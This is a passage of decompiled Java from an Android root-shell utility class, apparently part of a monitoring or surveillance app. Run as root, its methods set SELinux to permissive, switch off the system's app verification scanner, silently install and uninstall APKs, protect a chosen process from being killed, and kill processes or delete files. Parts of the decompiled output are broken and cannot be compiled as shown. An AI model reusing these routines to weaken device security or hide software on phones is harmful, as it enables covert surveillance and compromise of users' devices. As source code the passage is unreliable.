    //   253: pop
    //   254: goto -126 -> 128
    //   257: pop
    //   258: goto -25 -> 233
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	261	0	paramString	String
    //   1	214	1	bool1	boolean
    //   5	170	2	bool2	boolean
    //   12	100	3	str1	String
    //   130	26	3	localIOException1	IOException
    //   180	27	3	str2	String
    //   249	1	3	localIOException2	IOException
    //   15	222	4	localObject1	Object
    //   42	200	5	localBufferedReader	BufferedReader
    //   85	67	6	str3	String
    //   88	3	7	i	int
    //   95	59	8	localObject2	Object
    //   134	3	9	bool3	boolean
    //   190	27	10	localObject3	Object
    //   221	13	10	localObject4	Object
    //   253	1	15	localIOException3	IOException
    //   257	1	16	localIOException4	IOException
    // Exception table:
    //   from	to	target	type
    //   51	56	130	java/io/IOException
    //   62	66	130	java/io/IOException
    //   71	74	130	java/io/IOException
    //   90	95	130	java/io/IOException
    //   100	102	130	java/io/IOException
    //   104	109	130	java/io/IOException
    //   112	118	130	java/io/IOException
    //   51	56	221	finally
    //   62	66	221	finally
    //   71	74	221	finally
    //   90	95	221	finally
    //   100	102	221	finally
    //   104	109	221	finally
    //   112	118	221	finally
    //   131	134	221	finally
    //   145	149	221	finally
    //   155	160	221	finally
    //   160	165	249	java/io/IOException
    //   165	170	249	java/io/IOException
    //   236	241	249	java/io/IOException
    //   241	246	249	java/io/IOException
    //   118	123	253	java/io/IOException
    //   123	128	253	java/io/IOException
    //   223	228	257	java/io/IOException
    //   228	233	257	java/io/IOException
  }
  
  public static String b()
  {
    f localf = f.a();
    String str = localf.a("/system/bin/ps");
    localf.d();
    return str;
  }
  
  public static void b(String paramString1, String paramString2)
  {
    int i = 2;
    int j = 1;
    int k = 0;
    str1 = null;
    boolean bool2 = a;
    String str2;
    if (bool2)
    {
      str2 = "ShellUtil";
      localObject2 = "chown # START ...";
      Log.v(str2, (String)localObject2);
    }
    bool2 = a;
    if (bool2)
    {
      str2 = "ShellUtil";
      localObject3 = new Object[i];
      localObject3[0] = paramString1;
      localObject3[j] = paramString2;
      localObject2 = String.format("chown # owner: %s file: %s", (Object[])localObject3);
      Log.v(str2, (String)localObject2);
    }
    localObject2 = null;
    try
    {
      localObject2 = f.b();
      str2 = "chown %s.%s %s";
      i = 3;
      localObject3 = new Object[i];
      k = 0;
      str1 = null;
      localObject3[0] = paramString1;
      k = 1;
      localObject3[k] = paramString1;
      k = 2;
      localObject3[k] = paramString2;
      str2 = String.format(str2, (Object[])localObject3);
      ((f)localObject2).a(str2);
      str2 = "restorecon %s";
      i = 1;
      localObject3 = new Object[i];
      k = 0;
      str1 = null;
      localObject3[0] = paramString2;
      str2 = String.format(str2, (Object[])localObject3);
      ((f)localObject2).a(str2);
      if (localObject2 == null) {
        break label201;
      }
    }
    finally
    {
      try
      {
        for (;;)
        {
          boolean bool1 = b;
          if (bool1)
          {
            localObject3 = "ShellUtil";
            str1 = "chown # err ...";
            Log.e((String)localObject3, str1, localThrowable);
          }
          if (localObject2 == null) {}
        }
      }
      finally
      {
        if (localObject2 == null) {
          break label276;
        }
        ((f)localObject2).d();
      }
    }
    ((f)localObject2).d();
    label201:
    bool2 = a;
    if (bool2)
    {
      str2 = "ShellUtil";
      localObject2 = "chown # EXIT ...";
      Log.v(str2, (String)localObject2);
    }
  }
  
  public static boolean b(String paramString)
  {
    bool1 = true;
    for (;;)
    {
      try
      {
        Object localObject1 = f.b();
        String str1 = "%s \"%s\"";
        int i = 2;
        Object[] arrayOfObject = new Object[i];
        int j = 0;
        String str2 = "/system/bin/ls";
        arrayOfObject[0] = str2;
        j = 1;
        arrayOfObject[j] = paramString;
        str1 = String.format(str1, arrayOfObject);
        str1 = ((f)localObject1).a(str1);
        ((f)localObject1).d();
        localObject1 = "No such file or directory";
        boolean bool2 = str1.contains((CharSequence)localObject1);
        if (bool2) {
          continue;
        }
      }
      catch (CannotGetRootShellException localCannotGetRootShellException)
      {
        Object localObject2;
        File localFile = new java/io/File;
        localFile.<init>(paramString);
        bool1 = localFile.exists();
        continue;
      }
      return bool1;
      bool1 = false;
      localObject2 = null;
    }
  }
  
  public static long c(String paramString)
  {
    l = -1;
    Object localObject1 = "%s -l \"%s\"";
    int i = 2;
    for (;;)
    {
      try
      {
        localObject2 = new Object[i];
        int j = 0;
        Object localObject3 = null;
        String str1 = "/system/bin/ls";
        localObject2[0] = str1;
        j = 1;
        localObject2[j] = paramString;
        localObject1 = String.format((String)localObject1, (Object[])localObject2);
        localObject1 = KMShell.a((String)localObject1);
        boolean bool1 = a;
        if (bool1)
        {
          localObject2 = "ShellUtil";
          localObject3 = new java/lang/StringBuilder;
          ((StringBuilder)localObject3).<init>();
          str1 = "getFileSize # line: ";
          localObject3 = ((StringBuilder)localObject3).append(str1);
          localObject3 = ((StringBuilder)localObject3).append((String)localObject1);
          localObject3 = ((StringBuilder)localObject3).toString();
          Log.v((String)localObject2, (String)localObject3);
        }
        bool1 = ((String)localObject1).isEmpty();
        if (!bool1)
        {
          localObject2 = c;
          localObject1 = ((Pattern)localObject2).matcher((CharSequence)localObject1);
          bool1 = ((Matcher)localObject1).matches();
          if (!bool1) {
            continue;
          }
          int k = 4;
          String str2 = ((Matcher)localObject1).group(k);
          boolean bool2 = a;
          if (bool2)
          {
            String str3 = "ShellUtil";
            localObject1 = new java/lang/StringBuilder;
            ((StringBuilder)localObject1).<init>();
            localObject2 = "getFileSize # size: ";
            localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
            localObject1 = ((StringBuilder)localObject1).append(str2);
            localObject1 = ((StringBuilder)localObject1).toString();
            Log.v(str3, (String)localObject1);
          }
          l = Long.parseLong(str2);
        }
      }
      catch (KMShell.ShellException localShellException)
      {
        Object localObject2;
        boolean bool3;
        File localFile = new java/io/File;
        localFile.<init>(paramString);
        l = localFile.length();
        continue;
      }
      return l;
      bool3 = a;
      if (bool3)
      {
        localObject1 = "ShellUtil";
        localObject2 = "getFileSize # no matches found!";
        Log.v((String)localObject1, (String)localObject2);
      }
    }
  }
  
  public static void c(String paramString1, String paramString2)
  {
    boolean bool1 = a;
    if (bool1)
    {
      str = "ShellUtil";
      localObject1 = "chcon # START ...";
      Log.v(str, (String)localObject1);
    }
    String str = "chcon %s %s";
    int i = 2;
    try
    {
      localObject1 = new Object[i];
      int j = 0;
      localObject2 = null;
      localObject1[0] = paramString1;
      j = 1;
      localObject1[j] = paramString2;
      str = String.format(str, (Object[])localObject1);
      bool2 = a;
      if (bool2)
      {
        localObject1 = "ShellUtil";
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        Object localObject3 = "chcon # cmd: ";
        localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
        localObject2 = ((StringBuilder)localObject2).append(str);
        localObject2 = ((StringBuilder)localObject2).toString();
        localObject3 = null;
        localObject3 = new Object[0];
        localObject2 = String.format((String)localObject2, (Object[])localObject3);
        Log.v((String)localObject1, (String)localObject2);
      }
      KMShell.a(str);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject2;
        boolean bool2 = b;
        if (bool2)
        {
          localObject1 = "ShellUtil";
          localObject2 = "chcon # Error!!";
          Log.e((String)localObject1, (String)localObject2, localException);
        }
      }
    }
    bool1 = a;
    if (bool1)
    {
      str = "ShellUtil";
      localObject1 = "chcon # EXIT ...";
      Log.v(str, (String)localObject1);
    }
  }
  
  public static boolean c()
  {
    boolean bool1 = a;
    String str1;
    String str2;
    if (bool1)
    {
      str1 = "ShellUtil";
      str2 = "isDeviceRooted # START ...";
      Log.v(str1, str2);
    }
    bool1 = g();
    if (!bool1)
    {
      bool1 = h();
      if (!bool1)
      {
        bool1 = i();
        if (!bool1)
        {
          bool1 = j();
          if (!bool1)
          {
            bool1 = k();
            if (!bool1) {
              break label137;
            }
          }
        }
      }
    }
    bool1 = true;
    for (;;)
    {
      boolean bool2 = a;
      Object localObject;
      if (bool2)
      {
        str2 = "ShellUtil";
        localObject = new java/lang/StringBuilder;
        ((StringBuilder)localObject).<init>();
        String str3 = "isDeviceRooted # isDeviceRooted ? : ";
        localObject = str3 + bool1;
        Log.v(str2, (String)localObject);
      }
      bool2 = a;
      if (bool2)
      {
        str2 = "ShellUtil";
        localObject = "isDeviceRooted # EXIT ...";
        Log.v(str2, (String)localObject);
      }
      return bool1;
      label137:
      bool1 = false;
      str1 = null;
    }
  }
  
  public static ShellUtil.SELinuxMode d()
  {
    ShellUtil.SELinuxMode localSELinuxMode = ShellUtil.SELinuxMode.UNKNOWN;
    localSELinuxMode = l();
    boolean bool = a;
    Object localObject2;
    String str;
    if (bool)
    {
      localObject1 = "ShellUtil";
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      str = "getRunningSELinuxModeMethod1 # mode :";
      localObject2 = str + localSELinuxMode;
      Log.v((String)localObject1, (String)localObject2);
    }
    Object localObject1 = ShellUtil.SELinuxMode.UNKNOWN;
    if (localSELinuxMode == localObject1)
    {
      localSELinuxMode = m();
      bool = a;
      if (bool)
      {
        localObject1 = "ShellUtil";
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        str = "getRunningSELinuxModeMethod2 # mode :";
        localObject2 = str + localSELinuxMode;
        Log.v((String)localObject1, (String)localObject2);
      }
    }
    bool = a;
    if (bool)
    {
      localObject1 = "ShellUtil";
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      str = "getRunningSELinuxMode # mode ?";
      localObject2 = str + localSELinuxMode;
      Log.v((String)localObject1, (String)localObject2);
    }
    return localSELinuxMode;
  }
  
  public static boolean d(String paramString)
  {
    boolean bool1 = true;
    Object localObject;
    boolean bool2;
    if (paramString != null)
    {
      localObject = f(paramString);
      int i = ((HashSet)localObject).size();
      if (i > 0)
      {
        Iterator localIterator = ((HashSet)localObject).iterator();
        for (;;)
        {
          bool2 = localIterator.hasNext();
          if (!bool2) {
            break;
          }
          localObject = (d)localIterator.next();
          String str1 = ((d)localObject).b;
          e(str1);
          boolean bool3 = a;
          if (bool3)
          {
            str1 = "ShellUtil";
            String str2 = "killProcessByName # Name: %s, pid: %s killed !!";
            int j = 2;
            Object[] arrayOfObject = new Object[j];
            arrayOfObject[0] = paramString;
            localObject = ((d)localObject).b;
            arrayOfObject[bool1] = localObject;
            localObject = String.format(str2, arrayOfObject);
            Log.v(str1, (String)localObject);
          }
        }
        bool2 = bool1;
      }
    }
    for (;;)
    {
      return bool2;
      bool2 = false;
      localObject = null;
    }
  }
  
  public static void e()
  {
    boolean bool1 = a;
    if (bool1)
    {
      str1 = "ShellUtil";
      str2 = "switchSELinuxModeToPermissive # START ...";
      Log.v(str1, str2);
    }
    String str1 = "/system/bin/setenforce 0";
    try
    {
      KMShell.a(str1);
      long l = 500L;
      SystemClock.sleep(l);
    }
    finally
    {
      for (;;)
      {
        boolean bool2 = b;
        if (bool2)
        {
          str2 = "ShellUtil";
          String str3 = "switchSELinuxModeToPermissive # err ...";
          Log.e(str2, str3, localThrowable);
        }
      }
    }
    bool1 = a;
    if (bool1)
    {
      str1 = "ShellUtil";
      str2 = "switchSELinuxModeToPermissive # EXIT ...";
      Log.v(str1, str2);
    }
  }
  
  public static void e(String paramString)
  {
    int i = 1;
    try
    {
      Object localObject1 = f.b();
      localObject2 = "kill -9 %s";
      boolean bool1 = true;
      localObject3 = new Object[bool1];
      int j = 0;
      localObject4 = null;
      localObject3[0] = paramString;
      localObject2 = String.format((String)localObject2, (Object[])localObject3);
      localObject2 = ((f)localObject1).a((String)localObject2);
      bool1 = a;
      int k;
      Object[] arrayOfObject;
      if (bool1)
      {
        localObject3 = "ShellUtil";
        localObject4 = "killProcessByPid # out %s";
        k = 1;
        arrayOfObject = new Object[k];
        arrayOfObject[0] = localObject2;
        localObject2 = String.format((String)localObject4, arrayOfObject);
        Log.v((String)localObject3, (String)localObject2);
      }
      ((f)localObject1).d();
      localObject1 = "kill -9 %s";
      bool2 = true;
      localObject2 = new Object[bool2];
      bool1 = false;
      localObject3 = null;
      localObject2[0] = paramString;
      localObject1 = String.format((String)localObject1, (Object[])localObject2);
      localObject1 = KMShell.a((String)localObject1);
      bool2 = a;
      if (bool2)
      {
        localObject2 = "ShellUtil";
        localObject3 = "killProcessByPid # out %s";
        j = 1;
        localObject4 = new Object[j];
        k = 0;
        arrayOfObject = null;
        localObject4[0] = localObject1;
        localObject1 = String.format((String)localObject3, (Object[])localObject4);
        Log.v((String)localObject2, (String)localObject1);
      }
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        bool2 = b;
        if (bool2)
        {
          localObject2 = "ShellUtil";
          localObject3 = "killProcessByPid # Error!! %s";
          localObject4 = new Object[i];
          String str1 = localShellException.toString();
          localObject4[0] = str1;
          str1 = String.format((String)localObject3, (Object[])localObject4);
          Log.e((String)localObject2, str1);
        }
      }
    }
    catch (CannotGetRootShellException localCannotGetRootShellException)
    {
      for (;;)
      {
        Object localObject2;
        Object localObject3;
        Object localObject4;
        boolean bool2 = b;
        if (bool2)
        {
          localObject2 = "ShellUtil";
          localObject3 = "killProcessByPid # Error!! %s";
          localObject4 = new Object[i];
          String str2 = localCannotGetRootShellException.toString();
          localObject4[0] = str2;
          str2 = String.format((String)localObject3, (Object[])localObject4);
          Log.e((String)localObject2, str2);
        }
      }
    }
  }
  
  public static HashSet f(String paramString)
  {
    int i = 8;
    Object localObject1 = b();
    Object localObject2 = new java/io/BufferedReader;
    Object localObject3 = new java/io/StringReader;
    ((StringReader)localObject3).<init>((String)localObject1);
    int j = 256;
    ((BufferedReader)localObject2).<init>((Reader)localObject3, j);
    localObject3 = new java/util/HashSet;
    ((HashSet)localObject3).<init>();
    try
    {
      Object localObject4;
      for (;;)
      {
        localObject1 = ((BufferedReader)localObject2).readLine();
        if (localObject1 == null) {
          break;
        }
        boolean bool2 = ((String)localObject1).contains(paramString);
        if (bool2)
        {
          localObject4 = "\\s+";
          localObject1 = ((String)localObject1).split((String)localObject4);
          int k = localObject1.length;
          if (k > i)
          {
            localObject4 = new com/vvt/shell/d;
            ((d)localObject4).<init>();
            int m = 0;
            String str = null;
            str = localObject1[0];
            ((d)localObject4).a = str;
            m = 1;
            str = localObject1[m];
            ((d)localObject4).b = str;
            m = 2;
            str = localObject1[m];
            ((d)localObject4).c = str;
            m = 3;
            str = localObject1[m];
            ((d)localObject4).d = str;
            m = 4;
            str = localObject1[m];
            ((d)localObject4).e = str;
            m = 5;
            str = localObject1[m];
            ((d)localObject4).f = str;
            m = 6;
            str = localObject1[m];
            ((d)localObject4).g = str;
            m = 7;
            str = localObject1[m];
            ((d)localObject4).h = str;
            m = 8;
            localObject1 = localObject1[m];
            ((d)localObject4).i = ((String)localObject1);
            localObject1 = ((d)localObject4).i;
            boolean bool1 = ((String)localObject1).equals(paramString);
            if (bool1)
            {
              localObject1 = ((d)localObject4).h;
              str = "S";
              bool1 = ((String)localObject1).equals(str);
              if (!bool1)
              {
                localObject1 = ((d)localObject4).h;
                str = "R";
                bool1 = ((String)localObject1).equals(str);
                if (!bool1) {}
              }
              else
              {
                ((HashSet)localObject3).add(localObject4);
              }
            }
          }
        }
      }
      boolean bool3;
      return (HashSet)localObject3;
    }
    catch (IOException localIOException)
    {
      bool3 = a;
      if (bool3)
      {
        localObject2 = "ShellUtil";
        localObject4 = "findDuplicatedProcess # Error!!";
        Log.e((String)localObject2, (String)localObject4, localIOException);
      }
    }
    for (;;)
    {
      ((BufferedReader)localObject2).close();
    }
  }
  
  public static void f()
  {
    boolean bool1 = a;
    if (bool1)
    {
      str1 = "ShellUtil";
      str2 = "disableAppVerificationScanner # START ...";
      Log.v(str1, str2);
    }
    String str1 = "settings put global package_verifier_enable 0";
    try
    {
      KMShell.a(str1);
      long l = 500L;
      SystemClock.sleep(l);
    }
    finally
    {
      for (;;)
      {
        boolean bool2 = b;
        if (bool2)
        {
          str2 = "ShellUtil";
          String str3 = "disableAppVerificationScanner # err ...";
          Log.e(str2, str3, localThrowable);
        }
      }
    }
    bool1 = a;
    if (bool1)
    {
      str1 = "ShellUtil";
      str2 = "disableAppVerificationScanner # EXIT ...";
      Log.v(str1, str2);
    }
  }
  
  public static void g(String paramString)
  {
    bool = a;
    Object localObject;
    if (bool)
    {
      localObject = "ShellUtil";
      str2 = "installApk # ENTER ...";
      Log.v((String)localObject, str2);
    }
    try
    {
      localObject = f.b();
      str2 = "pm install %s";
      int i = 1;
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = paramString;
      str2 = String.format(str2, arrayOfObject);
      ((f)localObject).a(str2);
      ((f)localObject).d();
    }
    catch (CannotGetRootShellException localCannotGetRootShellException)
    {
      for (;;)
      {
        bool = a;
        if (bool)
        {
          String str1 = "ShellUtil";
          str2 = "installApk # Getting root failed!!";
          Log.v(str1, str2);
        }
      }
    }
    bool = a;
    if (bool)
    {
      localObject = "ShellUtil";
      str2 = "installApk # EXIT ...";
      Log.v((String)localObject, str2);
    }
  }
  
  private static boolean g()
  {
    String str1 = Build.TAGS;
    String str2;
    boolean bool1;
    if (str1 != null)
    {
      str2 = "test-keys";
      bool1 = str1.contains(str2);
      if (bool1) {
        bool1 = true;
      }
    }
    for (;;)
    {
      boolean bool2 = a;
      if (bool2)
      {
        str2 = "ShellUtil";
        Object localObject = new java/lang/StringBuilder;
        ((StringBuilder)localObject).<init>();
        String str3 = "checkRootMethod1 # isDeviceRooted ? : ";
        localObject = str3 + bool1;
        Log.v(str2, (String)localObject);
      }
      return bool1;
      bool1 = false;
      str1 = null;
    }
  }
  
  public static void h(String paramString)
  {
    bool1 = true;
    bool2 = false;
    localObject1 = null;
    boolean bool3 = a;
    String str1;
    if (bool3)
    {
      localObject2 = "ShellUtil";
      str1 = "uninstallApk # ENTER ...";
      Log.v((String)localObject2, str1);
    }
    for (;;)
    {
      try
      {
        localObject2 = f.b();
        int i = Build.VERSION.SDK_INT;
        int j = 23;
        if (i < j) {
          continue;
        }
        if (!bool1) {
          continue;
        }
        str2 = "pm uninstall %s";
        bool2 = true;
        localObject1 = new Object[bool2];
        i = 0;
        str1 = null;
        localObject1[0] = paramString;
        str2 = String.format(str2, (Object[])localObject1);
        ((f)localObject2).a(str2);
        ((f)localObject2).d();
      }
      catch (CannotGetRootShellException localCannotGetRootShellException)
      {
        String str2;
        bool1 = a;
        if (!bool1) {
          continue;
        }
        String str3 = "ShellUtil";
        localObject1 = "uninstallApk # Getting root failed!!";
        Log.v(str3, (String)localObject1);
        continue;
      }
      catch (Exception localException)
      {
        bool2 = b;
        if (!bool2) {
          continue;
        }
        localObject1 = "ShellUtil";
        localObject2 = "uninstallApk # ERROR: ";
        Log.e((String)localObject1, (String)localObject2, localException);
        continue;
      }
      bool1 = a;
      if (bool1)
      {
        str2 = "ShellUtil";
        localObject1 = "uninstallApk # EXIT ...";
        Log.v(str2, (String)localObject1);
      }
      return;
      bool1 = false;
      str2 = null;
      continue;
      str2 = "su system";
      ((f)localObject2).a(str2);
    }
  }
  
  private static boolean h()
  {
    try
    {
      File localFile = new java/io/File;
      str1 = "/system/app/Superuser.apk";
      localFile.<init>(str1);
      bool1 = localFile.exists();
    }
    catch (Exception localException)
    {
      for (;;)
      {
        String str1;
        boolean bool2;
        Object localObject2;
        String str2;
        boolean bool1 = false;
        Object localObject1 = null;
      }
    }
    bool2 = a;
    if (bool2)
    {
      str1 = "ShellUtil";
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      str2 = "checkRootMethod2 # isDeviceRooted ? : ";
      localObject2 = str2 + bool1;
      Log.v(str1, (String)localObject2);
    }
    return bool1;
  }
  
  public static void i(String paramString)
  {
    try
    {
      f localf = f.b();
      String str = "rm %s";
      int i = 1;
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = paramString;
      str = String.format(str, arrayOfObject);
      localf.a(str);
      localf.d();
      return;
    }
    catch (CannotGetRootShellException localCannotGetRootShellException)
    {
      for (;;) {}
    }
  }
  
  private static boolean i()
  {
    boolean bool1 = true;
    boolean bool2 = false;
    String str1 = null;
    Object localObject1 = new String[10];
    localObject1[0] = "/sbin/";
    localObject1[bool1] = "/system/bin/";
    localObject1[2] = "/system/xbin/";
    localObject1[3] = "/data/local/xbin/";
    localObject1[4] = "/data/local/bin/";
    localObject1[5] = "/system/sd/xbin/";
    localObject1[6] = "/system/bin/failsafe/";
    localObject1[7] = "/data/local/";
    localObject1[8] = "/su/bin/";
    String str2 = "/su/xbin/";
    localObject1[9] = str2;
    int i = localObject1.length;
    int j = 0;
    Object localObject2 = null;
    if (j < i)
    {
      String str3 = localObject1[j];
      File localFile = new java/io/File;
      Object localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject3 = ((StringBuilder)localObject3).append(str3);
      String str4 = "su";
      localObject3 = str4;
      localFile.<init>((String)localObject3);
      boolean bool3 = localFile.exists();
      if (bool3)
      {
        bool2 = a;
        if (bool2)
        {
          str1 = "ShellUtil";
          localObject2 = new java/lang/StringBuilder;
          ((StringBuilder)localObject2).<init>();
          localObject2 = ((StringBuilder)localObject2).append("checkRootMethod3 # found : ").append(str3);
          localObject1 = "su";
          localObject2 = (String)localObject1;
          Log.v(str1, (String)localObject2);
        }
      }
    }
    for (;;)
    {
      bool2 = a;
      if (bool2)
      {
        str1 = "ShellUtil";
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        localObject1 = "checkRootMethod3 # isDeviceRooted ? : ";
        localObject2 = (String)localObject1 + bool1;
        Log.v(str1, (String)localObject2);
      }
      return bool1;
      j += 1;
      break;
      bool1 = false;
    }
  }
  
  public static void j(String paramString)
  {
    boolean bool1 = a;
    Object localObject1;
    if (bool1)
    {
      localObject1 = "ShellUtil";
      localObject2 = "protect # START ...";
      Log.v((String)localObject1, (String)localObject2);
    }
    for (;;)
    {
      try
      {
        localObject1 = f(paramString);
        if (localObject1 == null) {
          continue;
        }
        boolean bool2 = ((HashSet)localObject1).isEmpty();
        if (bool2) {
          continue;
        }
        localObject1 = ((HashSet)localObject1).iterator();
        localObject1 = ((Iterator)localObject1).next();
        localObject1 = (d)localObject1;
        localObject2 = ((d)localObject1).b;
        if (localObject2 != null)
        {
          localObject2 = ((d)localObject1).b;
          localObject2 = ((String)localObject2).trim();
          int i = ((String)localObject2).length();
          if (i > 0)
          {
            localObject2 = "echo '-17' > /proc/%s/oom_adj";
            boolean bool4 = true;
            localObject3 = new Object[bool4];
            Object localObject4 = null;
            String str = ((d)localObject1).b;
            localObject3[0] = str;
            localObject2 = String.format((String)localObject2, (Object[])localObject3);
            bool4 = a;
            if (bool4)
            {
              localObject3 = "ShellUtil";
              localObject4 = new java/lang/StringBuilder;
              ((StringBuilder)localObject4).<init>();
              str = "protect # cmd :";
              localObject4 = ((StringBuilder)localObject4).append(str);
              localObject4 = ((StringBuilder)localObject4).append((String)localObject2);
              localObject4 = ((StringBuilder)localObject4).toString();
              Log.v((String)localObject3, (String)localObject4);
            }
            KMShell.a((String)localObject2);
            localObject2 = "chmod 444 /proc/%s/oom_adj";
            bool4 = true;
            localObject3 = new Object[bool4];
            localObject4 = null;
            localObject1 = ((d)localObject1).b;
            localObject3[0] = localObject1;
            localObject1 = String.format((String)localObject2, (Object[])localObject3);
            bool3 = a;
            if (bool3)
            {
              localObject2 = "ShellUtil";
              localObject3 = new java/lang/StringBuilder;
              ((StringBuilder)localObject3).<init>();
              localObject4 = "protect # cmd :";
              localObject3 = ((StringBuilder)localObject3).append((String)localObject4);
              localObject3 = ((StringBuilder)localObject3).append((String)localObject1);
              localObject3 = ((StringBuilder)localObject3).toString();
              Log.v((String)localObject2, (String)localObject3);
            }
            KMShell.a((String)localObject1);
          }
        }
      }
      finally
      {
        boolean bool3 = b;
        if (!bool3) {
          continue;
        }
        localObject2 = "ShellUtil";
        Object localObject3 = "protect # err ...";
        Log.e((String)localObject2, (String)localObject3, localThrowable);
        continue;
      }
      bool1 = a;
      if (bool1)
      {
        localObject1 = "ShellUtil";
        localObject2 = "protect # EXIT ...";
        Log.v((String)localObject1, (String)localObject2);
      }
      return;
      bool1 = b;
      if (bool1)
      {
        localObject1 = "ShellUtil";
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        localObject3 = "protect # Process name: ";
        localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
        localObject2 = ((StringBuilder)localObject2).append(paramString);
        localObject3 = " not found!";
        localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
        localObject2 = ((StringBuilder)localObject2).toString();
        Log.e((String)localObject1, (String)localObject2);
      }
    }
  }
  
  private static boolean j()
  {
    boolean bool1 = false;
    String str1 = null;
    Object localObject1 = System.getenv("PATH").split(":");
    int i = localObject1.length;
    int j = 0;
    Object localObject2 = null;
    for (;;)
    {
      boolean bool2;
      if (j < i)
      {
        String str2 = localObject1[j];
        File localFile = new java/io/File;
        String str3 = "su";
        localFile.<init>(str2, str3);
        boolean bool3 = localFile.exists();
        if (bool3)
        {
          bool1 = a;
          if (bool1)
          {
            str1 = "ShellUtil";
            localObject2 = new java/lang/StringBuilder;
            ((StringBuilder)localObject2).<init>();
            localObject2 = ((StringBuilder)localObject2).append("checkRootMethod4 # found : ").append(str2);
            localObject1 = "su";
            localObject2 = (String)localObject1;
            Log.v(str1, (String)localObject2);
          }
          bool1 = true;
        }
      }
      else
      {
        bool2 = a;
        if (bool2)
        {
          localObject2 = "ShellUtil";
          localObject1 = new java/lang/StringBuilder;
          ((StringBuilder)localObject1).<init>();
          String str4 = "checkRootMethod4 # isDeviceRooted ? : ";
          localObject1 = str4 + bool1;
          Log.v((String)localObject2, (String)localObject1);
        }
        return bool1;
      }
      int k;
      bool2 += true;
    }
  }
  
  public static void k(String paramString)
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1)
    {
      str = "ShellUtil";
      localObject1 = "restorecon # START ...";
      Log.v(str, (String)localObject1);
    }
    bool1 = a;
    if (bool1)
    {
      str = "ShellUtil";
      localObject2 = new Object[i];
      localObject2[0] = paramString;
      localObject1 = String.format("restorecon # file: %s", (Object[])localObject2);
      Log.v(str, (String)localObject1);
    }
    String str = "restorecon %s";
    bool2 = true;
    try
    {
      localObject1 = new Object[bool2];
      i = 0;
      localObject2 = null;
      localObject1[0] = paramString;
      str = String.format(str, (Object[])localObject1);
      KMShell.a(str);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool2 = b;
        if (bool2)
        {
          localObject1 = "ShellUtil";
          localObject2 = "restorecon # Error!!";
          Log.e((String)localObject1, (String)localObject2, localException);
        }
      }
    }
    bool1 = a;
    if (bool1)
    {
      str = "ShellUtil";
      localObject1 = "restorecon # EXIT ...";
      Log.v(str, (String)localObject1);
    }
  }
  
  private static boolean k()
  {
    Object localObject1 = new com/vvt/shell/ExecShell;
    ((ExecShell)localObject1).<init>();
    Object localObject2 = ExecShell.SHELL_CMD.check_su_binary;
    localObject1 = ((ExecShell)localObject1).a((ExecShell.SHELL_CMD)localObject2);
    boolean bool1 = false;
    localObject2 = null;
    Object localObject3;
    boolean bool2;
    String str;
    if (localObject1 != null)
    {
      localObject3 = ((ArrayList)localObject1).iterator();
      boolean bool3;
      do
      {
        bool2 = ((Iterator)localObject3).hasNext();
        if (!bool2) {
          break;
        }
        localObject1 = (String)((Iterator)localObject3).next();
        str = "/su";
        bool3 = ((String)localObject1).contains(str);
      } while (!bool3);
      bool1 = a;
      if (bool1)
      {
        localObject2 = "ShellUtil";
        localObject3 = new java/lang/StringBuilder;
        ((StringBuilder)localObject3).<init>();
        str = "checkRootMethod5 # found /su in : ";
        localObject3 = ((StringBuilder)localObject3).append(str);
        localObject1 = (String)localObject1;
        Log.v((String)localObject2, (String)localObject1);
      }
      bool2 = true;
    }
    for (;;)
    {
      bool1 = a;
      if (bool1)
      {
        localObject2 = "ShellUtil";
        localObject3 = new java/lang/StringBuilder;
        ((StringBuilder)localObject3).<init>();
        str = "checkRootMethod5 # isDeviceRooted : ";
        localObject3 = str + bool2;
        Log.v((String)localObject2, (String)localObject3);
      }
      return bool2;
      bool2 = false;
      localObject1 = null;
    }
  }
  
  private static ShellUtil.SELinuxMode l()
  {
    ShellUtil.SELinuxMode localSELinuxMode = ShellUtil.SELinuxMode.UNKNOWN;
    String str1 = "/system/bin/getenforce";
    for (;;)
    {
      try
      {
        str1 = KMShell.a(str1);
        if (str1 != null)
        {
          int i = str1.length();
          if (i > 0) {
            continue;
          }
        }
      }
      finally
      {
        String str3;
        boolean bool2;
        boolean bool1 = b;
        if (!bool1) {
          continue;
        }
        String str2 = "ShellUtil";
        Object localObject = "getRunningSELinuxModeMethod1 err ..";
        Log.e(str2, (String)localObject, localThrowable);
        continue;
      }
      return localSELinuxMode;
      str1 = str1.toLowerCase();
      bool1 = a;
      if (bool1)
      {
        str2 = "ShellUtil";
        localObject = new java/lang/StringBuilder;
        ((StringBuilder)localObject).<init>();
        str3 = "getRunningSELinuxModeMethod1 # getenforce output is ";
        localObject = ((StringBuilder)localObject).append(str3);
        localObject = ((StringBuilder)localObject).append(str1);
        localObject = ((StringBuilder)localObject).toString();
        Log.v(str2, (String)localObject);
      }
      str2 = "enforcing";
      bool1 = str1.contains(str2);
      if (bool1)
      {
        localSELinuxMode = ShellUtil.SELinuxMode.ENFORCING;
      }
      else
      {
        str2 = "permissive";
        bool2 = str1.contains(str2);
        if (bool2) {
          localSELinuxMode = ShellUtil.SELinuxMode.PERMISSIVE;
        }
      }
    }
  }
  
  public static void l(String paramString)
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1)
    {
      str = "ShellUtil";
      localObject1 = "restoreconDir # START ...";
      Log.v(str, (String)localObject1);
    }
    bool1 = a;
    if (bool1)
    {
      str = "ShellUtil";
